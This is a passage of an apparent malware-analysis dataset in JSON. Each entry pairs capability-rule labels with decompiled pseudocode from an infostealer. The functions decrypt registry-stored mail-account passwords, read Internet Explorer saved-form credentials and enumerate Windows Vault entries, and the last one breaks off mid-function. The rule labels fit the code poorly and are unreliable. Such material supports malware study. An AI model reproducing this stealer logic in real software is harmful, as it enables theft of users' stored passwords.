        "decompiled_code": "\nuint fcn.00411f98(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uchar auStack3504 [8];\n    int32_t iStack3496;\n    uchar *puStack3492;\n    uint uStack3488;\n    uchar *puStack3484;\n    uchar *puStack3480;\n    uchar *puStack3476;\n    uint uStack3472;\n    int32_t iStack3468;\n    uint uStack3464;\n    uint uStack3460;\n    uchar *puStack3456;\n    uint uStack3452;\n    uint uStack3448;\n    uint uStack3444;\n    uint uStack3440;\n    uchar *puStack3436;\n    uint uStack3420;\n    uint uStack3380;\n    uchar auStack3240 [4];\n    uchar auStack3236 [28];\n    char cStack3208;\n    uchar auStack3207 [479];\n    uchar auStack2728 [32];\n    uchar auStack2696 [224];\n    uchar auStack2472 [32];\n    uchar auStack2440 [276];\n    uchar auStack2164 [1024];\n    uchar auStack1140 [32];\n    uchar auStack1108 [940];\n    uint uStack168;\n    uchar auStack164 [4];\n    uint uStack160;\n    int32_t iStack152;\n    char cStack145;\n    int32_t iStack140;\n    uint uStack128;\n    uint uStack120;\n    char cStack114;\n    uchar uStack113;\n    uchar auStack108 [4];\n    uint uStack104;\n    int32_t iStack92;\n    uint uStack84;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack60;\n    uchar auStack52 [8];\n    uint uStack44;\n    uint uStack40;\n    uchar auStack32 [4];\n    uint uStack28;\n    uchar uStack22;\n    uint uStack20;\n    uint uStack16;\n    \n    uStack40 = 0;\n    uStack44 = 0;\n    uStack16 = 0;\n    uStack28 = 0;\n    uStack20 = 0;\n    uStack22 = 0;\n    uStack3380 = 0x400;\n    puStack3436 = &stack0xffffffe0;\n    uStack3440 = 0xf003f;\n    uStack3444 = 0;\n    uStack3448 = param_1;\n    uStack3452 = 0x80000001;\n    puStack3456 = 0x412017;\n    iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n    if (iVar2 == 0) {\n        while( true ) {\n            uStack3464 = 0;\n            iStack3468 = 0;\n            uStack3472 = 0;\n            puStack3476 = NULL;\n            puStack3480 = &stack0xfffff2a4;\n            puStack3484 = &stack0xfffffbac;\n            uStack3488 = uStack60;\n            puStack3492 = puStack72;\n            iStack3496 = 0x412757;\n            iVar2 = sub.ADVAPI32.DLL_RegEnumKeyExA();\n            if (iVar2 == 0x103) break;\n            iStack92 = iStack92 + 1;\n            fcn.00419fa8(&stack0xfffff78c, 0x400, 0x41f99a, uStack68, &stack0xfffffb8c);\n            uVar5 = 0xf003f;\n            uVar4 = 0;\n            iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA(0x80000001, &stack0xfffff78c, 0, 0xf003f, &stack0xffffff94);\n            if (iVar2 == 0) {\n                uStack113 = 0;\n                cStack114 = '\\0';\n                uVar3 = fcn.0040b60e(\"jlC4i\");\n                cVar1 = fcn.00411d55(uStack128, uVar3, &stack0xfffff578, 0x100, &stack0xfffff274);\n                if (cVar1 != '\\0') {\n                    uVar3 = fcn.0040b60e(\"9T9N u6d0\");\n                    cVar1 = fcn.00411d55(uStack128, uVar3, &stack0xfffff678, 0x100, &stack0xfffff274);\n                    if (cVar1 == '\\0') {\n                        uVar3 = fcn.0040b60e(\"XFD9 u6d0\");\n                        cVar1 = fcn.00411d55(uStack128, uVar3, &stack0xfffff678, 0x100, &stack0xfffff274);\n                        if (cVar1 == '\\0') {\n                            uVar3 = fcn.0040b60e(\"-qq9 u6d0\");\n                            cVar1 = fcn.00411d55(uStack128, uVar3, &stack0xfffff678, 0x100, &stack0xfffff274);\n                            if (cVar1 == '\\0') {\n                                uVar3 = fcn.0040b60e(\"MFq9 u6d0\");\n                                cVar1 = fcn.00411d55(uStack128, uVar3, &stack0xfffff678, 0x100, &stack0xfffff274);\n                                if (cVar1 == '\\0') {\n                                    uVar3 = fcn.0040b60e(\"jDM u6d0\");\n                                    cVar1 = fcn.00411d55(uStack128, uVar3, &stack0xfffff678, 0x100, &stack0xfffff274);\n                                    if (cVar1 != '\\0') {\n                                        uVar3 = fcn.0040b60e(\"jDM Md02d0 urm\");\n                                        fcn.00411d55(uStack128, uVar3, &stack0xfffff278, 0x100, &stack0xfffff274);\n                                        uVar3 = fcn.0040b60e(\"jDM 9C66gW0S\");\n                                        cStack114 = fcn.00411d55(uStack128, uVar3, &stack0xfffff378, 0x200, \n                                                                 &stack0xfffff274);\n                                        uStack113 = 5;\n                                    }\n                                }\n                                else {\n                                    uVar3 = fcn.0040b60e(\"MFq9 Md02d0\");\n                                    fcn.00411d55(uStack128, uVar3, &stack0xfffff278, 0x100, &stack0xfffff274);\n                                    uVar3 = fcn.0040b60e(\"MFq9 9C66gW0S\");\n                                    cStack114 = fcn.00411d55(uStack128, uVar3, &stack0xfffff378, 0x200, &stack0xfffff274\n                                                            );\n                                    uStack113 = 4;\n                                }\n                            }\n                            else {\n                                uVar3 = fcn.0040b60e(\"-qq9 Md02d0\");\n                                fcn.00411d55(uStack128, uVar3, &stack0xfffff278, 0x100, &stack0xfffff274);\n                                uVar3 = fcn.0040b60e(\"-qq9 9C66gW0S\");\n                                cStack114 = fcn.00411d55(uStack128, uVar3, &stack0xfffff378, 0x200, &stack0xfffff274);\n                                uStack113 = 3;\n                            }\n                        }\n                        else {\n                            uVar3 = fcn.0040b60e(\"XFD9 Md02d0\");\n                            fcn.00411d55(uStack128, uVar3, &stack0xfffff278, 0x100, &stack0xfffff274);\n                            uVar3 = fcn.0040b60e(\"XFD9 9C66gW0S\");\n                            cStack114 = fcn.00411d55(uStack128, uVar3, &stack0xfffff378, 0x200, &stack0xfffff274);\n                            uStack113 = 2;\n                        }\n                    }\n                    else {\n                        uVar3 = fcn.0040b60e(\"9T9N Md02d0\");\n                        fcn.00411d55(uStack128, uVar3, &stack0xfffff278, 0x100, &stack0xfffff274);\n                        uVar3 = fcn.0040b60e(\"9T9N 9C66gW0S\");\n                        cStack114 = fcn.00411d55(uStack128, uVar3, &stack0xfffff378, 0x200, &stack0xfffff274);\n                        uStack113 = 1;\n                    }\n                    if ((cStack114 != '\\0') && (cStack3208 == '\\x02')) {\n                        puStack3480 = iStack3468 + -1;\n                        puStack3476 = &stack0xfffff379;\n                        iVar2 = sub.CRYPT32.DLL_CryptUnprotectData(&stack0xfffff268, 0, 0, 0, 0, 1, &stack0xfffff260);\n                        if (iVar2 != 0) {\n                            fcn.0041a5e1(&stack0xfffff35c, uVar5, uVar4);\n                            sub.KERNEL32.dll_LocalFree(uVar5);\n                        }\n                    }\n                    if (cStack145 != '\\0') {\n                        iStack152 = fcn.00419f10(&stack0xffffff5c, \"%c%c%S\\a%S\\a%S\\a%S\\b\\b\\b\\b\", 1, cStack145, \n                                                 &stack0xfffff258, &stack0xfffff558, &stack0xfffff658, &stack0xfffff358)\n                        ;\n                        if (iStack152 == -1) {\n                            iStack152 = fcn.00419f10(&stack0xffffff5c, \"%c%c%s\\a%s\\a%s\\a%S\\b\\b\\b\\b\", 1, cStack145, \n                                                     &stack0xfffff258, &stack0xfffff558, &stack0xfffff658, \n                                                     &stack0xfffff358);\n                            if (iStack152 != -1) {\n                                uStack168 = fcn.0041a022(&stack0xffffff58, iStack140, &stack0xffffff5c, iStack152, 1);\n                                iStack140 = iStack140 + iStack152;\n                            }\n                        }\n                        else {\n                            uStack168 = fcn.0041a022(&stack0xffffff58, iStack140, &stack0xffffff5c, iStack152, 1);\n                            iStack140 = iStack140 + iStack152;\n                        }\n                    }\n                }\n                sub.ADVAPI32.DLL_RegCloseKey(uStack160);\n            }\n            uStack3420 = 0x400;\n        }\n        sub.ADVAPI32.DLL_RegCloseKey(uStack104);\n        uStack84 = uStack120;\n    }\n    else {\n        puStack3456 = &stack0xffffffcc;\n        uStack3460 = 0x201;\n        uStack3464 = 0;\n        iStack3468 = uStack16;\n        uStack3472 = 0x80000001;\n        puStack3476 = 0x4127ae;\n        iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA();\n        if (iVar2 == 0) {\n            while( true ) {\n                uStack3464 = 0;\n                iStack3468 = 0;\n                uStack3472 = 0;\n                puStack3476 = NULL;\n                puStack3480 = &stack0xfffff2a4;\n                puStack3484 = &stack0xfffffbac;\n                uStack3488 = uStack60;\n                puStack3492 = puStack72;\n                iStack3496 = 0x412eee;\n                iVar2 = sub.ADVAPI32.DLL_RegEnumKeyExA();\n                if (iVar2 == 0x103) break;\n                iStack92 = iStack92 + 1;\n                fcn.00419fa8(&stack0xfffff78c, 0x400, 0x41f99a, uStack68, &stack0xfffffb8c);\n                iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA(0x80000001, &stack0xfffff78c, 0, 0xf023f, &stack0xffffff94);\n                if (iVar2 == 0) {\n                    uStack113 = 0;\n                    cStack114 = '\\0';\n                    uVar4 = fcn.0040b60e(\"jlC4i\");\n                    cVar1 = fcn.00411d55(uStack128, uVar4, &stack0xfffff578, 0x100, &stack0xfffff274);\n                    if (cVar1 != '\\0') {\n                        uVar4 = fcn.0040b60e(\"9T9N u6d0\");\n                        cVar1 = fcn.00411d55(uStack128, uVar4, &stack0xfffff678, 0x100, &stack0xfffff274);\n                        if (cVar1 == '\\0') {\n                            uVar4 = fcn.0040b60e(\"XFD9 u6d0\");\n                            cVar1 = fcn.00411d55(uStack128, uVar4, &stack0xfffff678, 0x100, &stack0xfffff274);\n                            if (cVar1 == '\\0') {\n                                uVar4 = fcn.0040b60e(\"-qq9 u6d0\");\n                                cVar1 = fcn.00411d55(uStack128, uVar4, &stack0xfffff678, 0x100, &stack0xfffff274);\n                                if (cVar1 == '\\0') {\n                                    uVar4 = fcn.0040b60e(\"MFq9 u6d0\");\n                                    cVar1 = fcn.00411d55(uStack128, uVar4, &stack0xfffff678, 0x100, &stack0xfffff274);\n                                    if (cVar1 == '\\0') {\n                                        uVar4 = fcn.0040b60e(\"jDM u6d0\");\n                                        cVar1 = fcn.00411d55(uStack128, uVar4, &stack0xfffff678, 0x100, &stack0xfffff274\n                                                            );\n                                        if (cVar1 != '\\0') {\n                                            uVar4 = fcn.0040b60e(\"jDM Md02d0 urm\");\n                                            fcn.00411d55(uStack128, uVar4, &stack0xfffff278, 0x100, &stack0xfffff274);\n                                            uVar4 = fcn.0040b60e(\"jDM 9C66gW0S\");\n                                            cStack114 = fcn.00411d55(uStack128, uVar4, &stack0xfffff378, 0x200, \n                                                                     &stack0xfffff274);\n                                            uStack113 = 5;\n                                        }\n                                    }\n                                    else {\n                                        uVar4 = fcn.0040b60e(\"MFq9 Md02d0\");\n                                        fcn.00411d55(uStack128, uVar4, &stack0xfffff278, 0x100, &stack0xfffff274);\n                                        uVar4 = fcn.0040b60e(\"MFq9 9C66gW0S\");\n                                        cStack114 = fcn.00411d55(uStack128, uVar4, &stack0xfffff378, 0x200, \n                                                                 &stack0xfffff274);\n                                        uStack113 = 4;\n                                    }\n                                }\n                                else {\n                                    uVar4 = fcn.0040b60e(\"-qq9 Md02d0\");\n                                    fcn.00411d55(uStack128, uVar4, &stack0xfffff278, 0x100, &stack0xfffff274);\n                                    uVar4 = fcn.0040b60e(\"-qq9 9C66gW0S\");\n                                    cStack114 = fcn.00411d55(uStack128, uVar4, &stack0xfffff378, 0x200, &stack0xfffff274\n                                                            );\n                                    uStack113 = 3;\n                                }\n                            }\n                            else {\n                                uVar4 = fcn.0040b60e(\"XFD9 Md02d0\");\n                                fcn.00411d55(uStack128, uVar4, &stack0xfffff278, 0x100, &stack0xfffff274);\n                                uVar4 = fcn.0040b60e(\"XFD9 9C66gW0S\");\n                                cStack114 = fcn.00411d55(uStack128, uVar4, &stack0xfffff378, 0x200, &stack0xfffff274);\n                                uStack113 = 2;\n                            }\n                        }\n                        else {\n                            uVar4 = fcn.0040b60e(\"9T9N Md02d0\");\n                            fcn.00411d55(uStack128, uVar4, &stack0xfffff278, 0x100, &stack0xfffff274);\n                            uVar4 = fcn.0040b60e(\"9T9N 9C66gW0S\");\n                            cStack114 = fcn.00411d55(uStack128, uVar4, &stack0xfffff378, 0x200, &stack0xfffff274);\n                            uStack113 = 1;\n                        }\n                        if ((cStack114 != '\\0') && (cStack3208 == '\\x02')) {\n                            iStack3496 = iStack3468 + -1;\n                            puStack3492 = &stack0xfffff379;\n                            uVar5 = 0;\n                            uVar4 = 0;\n                            iVar2 = sub.CRYPT32.DLL_CryptUnprotectData\n                                              (&stack0xfffff258, 0, 0, 0, 0, 1, &stack0xfffff250);\n                            if (iVar2 != 0) {\n                                fcn.0041a5e1(&stack0xfffff35c, uVar5, uVar4);\n                                sub.KERNEL32.dll_LocalFree(uVar5);\n                            }\n                        }\n                        if (cStack145 != '\\0') {\n                            iStack152 = fcn.00419f10(&stack0xffffff5c, \"%c%c%S\\a%S\\a%S\\a%S\\b\\b\\b\\b\", 1, cStack145, \n                                                     &stack0xfffff258, &stack0xfffff558, &stack0xfffff658, \n                                                     &stack0xfffff358);\n                            if (iStack152 == -1) {\n                                iStack152 = fcn.00419f10(&stack0xffffff5c, \"%c%c%s\\a%s\\a%s\\a%S\\b\\b\\b\\b\", 1, cStack145, \n                                                         &stack0xfffff258, &stack0xfffff558, &stack0xfffff658, \n                                                         &stack0xfffff358);\n                                if (iStack152 != -1) {\n                                    uStack168 = fcn.0041a022(&stack0xffffff58, iStack140, &stack0xffffff5c, iStack152, 1\n                                                            );\n                                    iStack140 = iStack140 + iStack152;\n                                }\n                            }\n                            else {\n                                uStack168 = fcn.0041a022(&stack0xffffff58, iStack140, &stack0xffffff5c, iStack152, 1);\n                                iStack140 = iStack140 + iStack152;\n                            }\n                        }\n                    }\n                    sub.ADVAPI32.DLL_RegCloseKey(uStack160);\n                }\n                uStack3420 = 0x400;\n            }\n            sub.ADVAPI32.DLL_RegCloseKey(uStack104);\n            uStack84 = uStack120;\n        }\n    }\n    return uStack84;\n}\n",
        "token_count": 4478
    },
    "0041379d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.0041379d(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uchar auStack200 [4];\n    uint uStack196;\n    int32_t iStack192;\n    code *pcStack188;\n    uint uStack184;\n    uint uStack180;\n    uchar auStack176 [4];\n    uchar auStack172 [6];\n    int16_t aiStack166 [29];\n    uchar auStack108 [8];\n    uchar auStack100 [4];\n    uint uStack96;\n    uint uStack92;\n    int16_t *piStack88;\n    int32_t iStack84;\n    code *pcStack80;\n    uint uStack76;\n    code *pcStack72;\n    uint uStack64;\n    uint uStack60;\n    int32_t iStack56;\n    code *pcStack52;\n    int32_t iStack44;\n    uint uStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    char *pcStack24;\n    \n    pcStack24 = \"abe2869f-9b47-4cd9-a358-c22904dba7f7\";\n    uVar1 = fcn.0040b60e(0x41fc74);\n    uStack32 = sub.KERNEL32.dll_LoadLibraryA(uVar1);\n    uVar1 = fcn.0040b60e(\"P0dSjRQld0C5dD\");\n    iStack44 = sub.KERNEL32.dll_GetProcAddress(uStack32, uVar1);\n    uVar1 = fcn.0040b60e(\"P0dS_0dd\");\n    iStack56 = sub.KERNEL32.dll_GetProcAddress(uStack40, uVar1);\n    for (uStack36 = 0; uStack36 < 0x25; uStack36 = uStack36 + 1) {\n        aiStack166[uStack36] = *(uStack36 + iStack44) * 4;\n    }\n    piStack88 = aiStack166;\n    uStack92 = 0x4a;\n    uStack180 = 0;\n    uStack40 = 0;\n    uStack184 = 0;\n    uStack60 = 0;\n    uVar1 = fcn.0040b60e(\"Y0Zs5Nh.Sii\");\n    uStack60 = fcn.0040b4e9(uVar1);\n    uVar1 = fcn.0040b60e(\"P0Zs5uRs0W5dY5aC5C\");\n    uStack64 = fcn.0040b4ff(uStack60, uVar1);\n    iVar2 = (*pcStack52)(0, 0, auStack172, auStack176);\n    if (iVar2 != 0) {\n        for (pcStack52 = NULL; pcStack52 < pcStack188; pcStack52 = pcStack52 + 1) {\n            if (*(*(iStack192 + pcStack52 * 4) + 4) == 1) {\n                piStack88 = *(*(iStack192 + pcStack52 * 4) + 0x1c);\n                uStack92 = *(*(iStack192 + pcStack52 * 4) + 0x18);\n                iVar2 = (*pcStack80)(&uStack92, 0, auStack108, 0, 0, 1, auStack100);\n                if (iVar2 != 0) {\n                    uVar3 = sub.msvcrt.dll_strlen(*(*(iStack192 + pcStack52 * 4) + 8));\n                    if (0x12 < uVar3) {\n                        iStack84 = fcn.00419f10(auStack200, \"%c%s\\a%S\\b\\b\\b\\b\", 2, \n                                                *(*(iStack192 + pcStack52 * 4) + 8) + 0x12, uStack96);\n                        if (iStack84 != -1) {\n                            uStack196 = fcn.0041a022(&uStack196, iStack56, auStack200, iStack84, 1);\n                            iStack56 = iStack56 + iStack84;\n                        }\n                    }\n                }\n            }\n        }\n        (*pcStack72)(iStack192);\n    }\n    fcn.0040b51d(uStack76);\n    return uStack196;\n}\n",
        "token_count": 959
    },
    "00413ad7": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.00413ad7(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uStack2664;\n    uint uStack2660;\n    ushort auStack2656 [1024];\n    uint32_t uStack608;\n    char acStack604 [4];\n    uchar auStack600 [260];\n    uchar auStack340 [260];\n    int32_t iStack80;\n    uint uStack76;\n    uint uStack72;\n    int32_t iStack68;\n    int32_t iStack64;\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    int32_t iStack36;\n    uint uStack32;\n    int32_t iStack28;\n    uint uStack20;\n    uint uStack16;\n    \n    iStack52 = 0;\n    uStack16 = 0;\n    iStack28 = sub.msvcrt.dll_fopen(param_1, 0x41ff31);\n    if (iStack28 == 0) {\n        uStack76 = 0;\n    }\n    else {\n        cVar1 = fcn.004130c7(iStack28, &iStack56, 4, 0x1c);\n        if (cVar1 == '\\x01') {\n            uStack32 = fcn.0041307a(&iStack56, 4);\n            cVar1 = fcn.004130c7(iStack28, &iStack56, 4, 0x20);\n            if (cVar1 == '\\x01') {\n                uStack20 = fcn.0041307a(&iStack56, 4);\n                iVar2 = sub.ADVAPI32.DLL_RegOpenKeyExA\n                                  (0x80000001, \"Software\\\\Microsoft\\\\Internet Explorer\\\\IntelliForms\\\\Storage2\", 0, \n                                   0x20019, &iStack60);\n                if (iVar2 == 0) {\n                    uStack608 = 0;\n                    while ((iStack40 != 0 &&\n                           (cVar1 = fcn.004130c7(uStack48, &uStack76, 4, iStack40 + 8),  cVar1 == '\\x01'))) {\n                        iStack56 = fcn.0041307a(&uStack76, 4);\n                        cVar1 = fcn.004130c7(uStack48, &uStack76, 4, iStack40 + 4);\n                        if (cVar1 != '\\x01') break;\n                        iStack60 = fcn.0041307a(&uStack76, 4);\n                        iStack60 = iStack60 << 7;\n                        for (iStack44 = iStack40 + 0x10; iStack44 < iStack60 + iStack40; iStack44 = iStack44 + 8) {\n                            cVar1 = fcn.004130c7(uStack48, acStack604, 4, iStack44);\n                            if ((cVar1 != '\\x01') ||\n                               (cVar1 = fcn.004130c7(uStack48, &uStack76, 4, iStack44 + 4),  cVar1 != '\\x01'))\n                            goto code_r0x004140c5;\n                            iStack64 = fcn.0041307a(&uStack76, 4);\n                            if ((acStack604[0] != '\\x03') &&\n                               (((iStack64 != 0xbadf00d && (iStack64 != 0)) &&\n                                (cVar1 = fcn.004130c7(uStack48, &uStack76, 4, iStack64),  cVar1 == '\\x01')))) {\n                                if ((((uStack76 == 'U') && (uStack76._1_1_ == 'R')) && (uStack76._2_1_ == 'L')) ||\n                                   (((uStack76 == 'L' && (uStack76._1_1_ == 'E')) &&\n                                    ((uStack76._2_1_ == 'A' && (uStack76._3_1_ == 'K')))))) {\n                                    cVar1 = fcn.0041360d(uStack48, iStack64, iStack52, auStack600, 0x104);\n                                    if (cVar1 == '\\x01') {\n                                        fcn.00413591(auStack600, auStack2656, 0x800, &uStack608);\n                                        cVar1 = fcn.004132fa(iStack80, auStack2656, uStack608, auStack340, 0x104);\n                                        if (cVar1 == '\\0') {\n                                            auStack2656[(uStack608 >> 1) - 1] = 0x2f;\n                                            uStack608 = uStack608 + 2;\n                                            cVar1 = fcn.004132fa(iStack80, auStack2656, uStack608, auStack340, 0x104);\n                                            if (cVar1 != '\\0') {\n                                                uStack2664 = 0;\n                                                iStack68 = fcn.00419f10(&uStack2664, 0x41ff73, auStack340);\n                                                if (iStack68 != -1) {\n                                                    uStack72 = fcn.0041a022(&uStack72, iStack36, &uStack2664, iStack68, \n                                                                            1);\n                                                    iStack36 = iStack36 + iStack68;\n                                                }\n                                            }\n                                        }\n                                        else {\n                                            uStack2660 = 0;\n                                            iStack68 = fcn.00419f10(&uStack2660, 0x41ff73, auStack340);\n                                            if (iStack68 != -1) {\n                                                uStack72 = fcn.0041a022(&uStack72, iStack36, &uStack2660, iStack68, 1);\n                                                iStack36 = iStack36 + iStack68;\n                                            }\n                                        }\n                                    }\n                                    else {\n                                        iStack40 = iStack56;\n                                    }\n                                }\n                            }\n                        }\n                        iStack40 = iStack56;\n                    }\ncode_r0x004140c5:\n                    if (iStack80 != 0) {\n                        sub.ADVAPI32.DLL_RegCloseKey(iStack80);\n                    }\n                    if (iStack52 != 0) {\n                        sub.msvcrt.dll_fclose(iStack52);\n                    }\n                }\n                else {\n                    uStack76 = 0;\n                }\n            }\n            else {\n                uStack76 = 0;\n            }\n        }\n        else {\n            uStack76 = 0;\n        }\n    }\n    return uStack76;\n}\n",
        "token_count": 1492
    },
    "00414368": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.00414368(uint *param_1)\n\n{\n    int32_t iVar1;\n    uchar *puStack1232;\n    char *pcStack1228;\n    char *pcStack1224;\n    uchar *puStack1220;\n    char *pcStack1216;\n    uchar *puStack1212;\n    char *pcStack1208;\n    uint uStack1204;\n    char *pcStack1200;\n    uint uStack1196;\n    char *pcStack1192;\n    uint uStack1188;\n    char *pcStack1184;\n    char *pcStack1180;\n    uint uStack1176;\n    uint uStack1172;\n    uchar auStack1160 [160];\n    uchar auStack1000 [64];\n    uchar auStack936 [224];\n    uchar auStack712 [32];\n    uchar auStack680 [256];\n    uchar auStack424 [160];\n    uint uStack264;\n    uint uStack252;\n    code *pcStack204;\n    code *pcStack200;\n    int32_t iStack184;\n    int32_t iStack180;\n    int32_t iStack168;\n    int32_t iStack164;\n    uchar *puStack160;\n    int32_t iStack156;\n    int32_t iStack152;\n    int32_t iStack148;\n    int32_t iStack136;\n    uchar auStack132 [12];\n    int32_t iStack120;\n    uchar *puStack116;\n    code *pcStack112;\n    int32_t iStack108;\n    int32_t iStack104;\n    code *pcStack100;\n    code *pcStack96;\n    code *pcStack92;\n    int32_t iStack88;\n    int32_t iStack84;\n    int32_t iStack80;\n    int32_t iStack76;\n    uchar *puStack72;\n    char *pcStack68;\n    uchar *puStack64;\n    int32_t iStack56;\n    int32_t iStack52;\n    char **ppcStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uint uStack16;\n    \n    iStack80 = 0x4bf4c442;\n    iStack76 = 0x41a09b8a;\n    puStack72 = 0x4add80b3;\n    pcStack68 = 0x28db4d70;\n    pcStack96 = 0x3ccd5499;\n    pcStack92 = 0x4b1087a8;\n    iStack88 = 0x886015a2;\n    iStack84 = 0x553bdd88;\n    pcStack100 = NULL;\n    uStack16 = 0;\n    *param_1 = 0;\n    uStack24 = 0;\n    uStack28 = 0;\n    iStack104 = 0;\n    iStack108 = 0;\n    pcStack112 = NULL;\n    puStack116 = NULL;\n    puStack32 = NULL;\n    uStack36 = 0;\n    pcStack1180 = \"2CQi5Yi4.Sii\";\n    pcStack1184 = 0x4144f7;\n    pcStack1180 = fcn.0040b60e();\n    pcStack1184 = 0x4144ff;\n    puStack32 = sub.KERNEL32.dll_LoadLibraryA();\n    if (puStack32 == NULL) {\n        iStack152 = 0;\n    }\n    else {\n        pcStack1184 = \"zCQi5TsdRzCQi5\";\n        uStack1188 = 0x414529;\n        pcStack1180 = fcn.0040b60e();\n        pcStack1184 = puStack32;\n        uStack1188 = 0x41453c;\n        iStack52 = sub.KERNEL32.dll_GetProcAddress();\n        pcStack1192 = \"zCQi5PiW6dzCQi5\";\n        uStack1196 = 0x414552;\n        uStack1188 = fcn.0040b60e();\n        pcStack1192 = iStack40;\n        uStack1196 = 0x414565;\n        puStack64 = sub.KERNEL32.dll_GetProcAddress();\n        pcStack1200 = \"zCQi5jRQld0C5dX5dl6\";\n        uStack1204 = 0x41457b;\n        uStack1196 = fcn.0040b60e();\n        pcStack1200 = ppcStack48;\n        uStack1204 = 0x41458e;\n        iStack76 = sub.KERNEL32.dll_GetProcAddress();\n        pcStack1208 = \"zCQi5Ed5X5dl\";\n        puStack1212 = 0x4145a4;\n        uStack1204 = fcn.0040b60e();\n        pcStack1208 = iStack56;\n        puStack1212 = 0x4145b7;\n        iStack88 = sub.KERNEL32.dll_GetProcAddress();\n        pcStack1216 = \"zCQi5Ed5X5dl\";\n        puStack1220 = 0x4145cd;\n        puStack1212 = fcn.0040b60e();\n        pcStack1216 = puStack64;\n        puStack1220 = 0x4145e0;\n        pcStack100 = sub.KERNEL32.dll_GetProcAddress();\n        pcStack1224 = \"zCQi5_0dd\";\n        pcStack1228 = 0x4145f6;\n        puStack1220 = fcn.0040b60e();\n        pcStack1224 = puStack72;\n        pcStack1228 = 0x414609;\n        pcStack112 = sub.KERNEL32.dll_GetProcAddress();\n        if (pcStack112 != NULL &&\n            ((((pcStack100 != NULL && pcStack92 != NULL) && pcStack96 != NULL) && iStack104 != 0) && iStack108 != 0)) {\n            pcStack1224 = &stack0xffffff64;\n            pcStack1228 = NULL;\n            puStack1232 = &stack0xffffff7c;\n            iStack76 = (*pcStack92)();\n            if (iStack76 == 0) {\n                puStack1220 = &stack0xffffff5c;\n                pcStack1224 = &stack0xffffff60;\n                pcStack1228 = 0x200;\n                puStack1232 = iStack156;\n                iStack76 = (*pcStack100)();\n                if ((iStack76 == 0) && (puStack160 != NULL)) {\n                    iVar1 = fcn.0041b0ec();\n                    if (((iVar1 == 0x14) ||\n                        (((iVar1 = fcn.0041b0ec(),  iVar1 == 0x16 || (iVar1 = fcn.0041b0ec(),  iVar1 == 0x15)) ||\n                         (iVar1 = fcn.0041b0ec(),  iVar1 == 0x18)))) ||\n                       ((iVar1 = fcn.0041b0ec(),  iVar1 == 0x17 || (iVar1 = fcn.0041b0ec(),  iVar1 == 0x19)))) {\n                        for (puStack72 = NULL; puStack72 < puStack160; puStack72 = puStack72 + 1) {\n                            puStack1232 = puStack72 * 0x38 + iStack164;\n                            pcStack1224 = 0x10;\n                            pcStack1228 = &stack0xffffff6c;\n                            iStack88 = puStack1232;\n                            iVar1 = fcn.0041a53c();\n                            if (iVar1 == 0) {\n                                pcStack1224 = *(iStack88 + 0x10);\n                                uStack1204 = 0;\n                                pcStack1208 = NULL;\n                                puStack1212 = 0x100;\n                                pcStack1216 = &stack0xfffffe58;\n                                puStack1220 = 0xffffffff;\n                                pcStack1228 = NULL;\n                                puStack1232 = NULL;\n                                sub.KERNEL32.dll_WideCharToMultiByte();\n                                sub.KERNEL32.dll_WideCharToMultiByte\n                                          (0, 0, *(iStack120 + 0x14) + 0x20, 0xffffffff, &stack0xfffffd38, 0x100, 0, 0);\n                                sub.KERNEL32.dll_WideCharToMultiByte\n                                          (0, 0, *(iStack152 + 0x18) + 0x20, 0xffffffff, &stack0xfffffc18, 0x100, 0, 0);\n                                uStack264 = 0;\n                                iStack44 = (*pcStack204)(uStack252, iStack184, *(iStack184 + 0x14), *(iStack184 + 0x18)\n                                                         , 0, 0, 0, &stack0xfffffef8);\n                                if (iStack44 == 0) {\n                                    iStack56 = iStack136;\n                                    pcStack1192 = *(iStack136 + 0x1c) + 0x20;\n                                    uStack1172 = 0;\n                                    uStack1176 = 0;\n                                    pcStack1180 = 0x100;\n                                    pcStack1184 = &stack0xfffffb78;\n                                    uStack1188 = 0xffffffff;\n                                    uStack1196 = 0;\n                                    puStack1232 = NULL;\n                                    uStack1204 = 0x414980;\n                                    sub.KERNEL32.dll_WideCharToMultiByte();\n                                    uStack1196 = 0;\n                                    puStack1212 = &stack0xfffffb58;\n                                    pcStack1216 = &stack0xfffffc58;\n                                    puStack1220 = &stack0xfffffd58;\n                                    pcStack1224 = 0x2;\n                                    pcStack1228 = \"%c%s\\a%s:%s\\b\\b\\b\\b\";\n                                    puStack1232 = &stack0xfffffb54;\n                                    puStack116 = fcn.00419f10();\n                                    if (puStack116 != 0xffffffff) {\n                                        pcStack1216 = 0x1;\n                                        pcStack1224 = &stack0xfffffb54;\n                                        pcStack1228 = pcStack68;\n                                        puStack1232 = &stack0xffffff68;\n                                        puStack1220 = puStack116;\n                                        iStack152 = fcn.0041a022();\n                                        pcStack68 = pcStack68 + puStack116;\n                                    }\n                                }\n                                if (iStack168 != 0) {\n                                    puStack1232 = iStack168;\n                                    (*pcStack112)();\n                                }\n                            }\n                        }\n                    